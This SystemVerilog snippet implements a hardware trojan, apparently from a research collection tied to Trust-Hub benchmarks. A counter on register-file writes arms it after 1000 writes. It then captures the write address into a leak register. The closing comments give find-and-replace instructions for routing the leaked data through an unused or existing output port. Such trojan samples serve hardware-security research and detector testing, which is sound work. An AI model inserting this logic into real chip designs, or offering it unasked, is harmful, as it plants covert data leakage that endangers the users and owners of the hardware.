/**
 * Sequential Leak Trojan - Code Snippet
 * 
 * Trust-Hub Category: Leak Information ✓ (Verified)
 * Trust-Hub Benchmarks: AES-T600, AES-T1400, AES-T800
 * 
 * Description:
 *   Leaks sensitive data to observable outputs
 *   
 * Trigger: Counter on we_gpr_o
 * Payload: Route waddr_o to leak port
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Counter-based)
// ============================================================

localparam int TRIGGER_THRESHOLD = 1000;
logic [31:0] trojan_counter;
logic trojan_active;

always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        trojan_counter <= '0;
        trojan_active  <= 1'b0;
    end else begin
        if (we_gpr_o) begin
            trojan_counter <= trojan_counter + 1;
        end
        
        if (trojan_counter >= TRIGGER_THRESHOLD) begin
            trojan_active <= 1'b1;
        end
    end
end

// ============================================================
// PAYLOAD: Data Leakage
// ============================================================
// Create leak register to hold secret data
logic [31:0] trojan_leak_data;

always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        trojan_leak_data <= '0;
    end else if (trojan_active) begin
        // Capture secret data when trojan is active
        trojan_leak_data <= waddr_o;
    end
end

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Information Leak: Route waddr_o to unused output
//
// Integration Script Must:
// 1. Find an unused output signal or create one
// 2. Modify that output to leak data when trojan_active
//
// Example:
//   Find: assign unused_output = 1'b0;
//   Replace: assign unused_output = trojan_active ? trojan_leak_data[0] : 1'b0;
//
// OR if no unused output, modify existing output:
//   Find: assign output_signal = normal_value;
//   Replace: assign output_signal = trojan_active ? waddr_o : normal_value;